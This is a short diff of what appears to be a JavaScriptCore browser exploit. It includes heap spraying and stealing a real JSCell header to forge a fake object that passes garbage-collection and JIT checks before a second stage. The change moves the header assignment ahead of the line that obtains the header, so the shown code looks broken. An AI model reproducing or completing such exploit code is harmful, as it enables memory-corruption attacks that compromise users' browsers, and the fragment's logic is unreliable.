@@ -571,6 +571,7 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
     // pointer of the float array.
     //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
     //victim1[0] = 1337;
+	       container.header = jscell_header
 //ok so simply stealing a header and using that isn't going to work as yes it'll pass gc test and wont crash but as soon as we trigger jit, jit will
 	      //look into its cache and see that were fake and invalid and cause a crash
 	      //so we can technically still steal a structureid or cell header but we also need to find a way to essentially clear the JIT Cache
@@ -600,7 +601,7 @@ fortunately fairly easy: execute the same get_by_val op twice, the second time w
     var jscell_header = results[0]; //make jscell_header equal that of victim1
     print("Stolen Real Cell Header: " + new Int64.fromDouble(jscell_header))
 //now we can set container to the real JSCellHeader so we wont ever crash :)
-	      container.header = jscell_header
+
 	      
       
     var stage2 = {
